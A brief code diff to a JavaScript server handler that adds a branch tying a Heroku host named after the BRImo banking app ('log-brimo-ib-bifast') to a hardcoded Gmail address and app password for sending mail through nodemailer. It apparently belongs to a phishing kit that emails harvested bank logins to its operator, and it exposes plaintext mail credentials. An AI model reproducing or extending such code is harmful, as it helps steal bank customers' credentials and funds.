@@ -32,6 +32,11 @@ export default function handler(req, res) {
         pass = 'hpwgbnwdgdpryjpa';
         
     }
+    else if (url == 'log-brimo-ib-bifast.herokuapp.com'){
+        email = 'ayamperu2019@gmail.com';
+        pass = 'ufseytnucdzgmbah';
+        
+    }
         
         try {
             const transporter = nodemailer.createTransport({
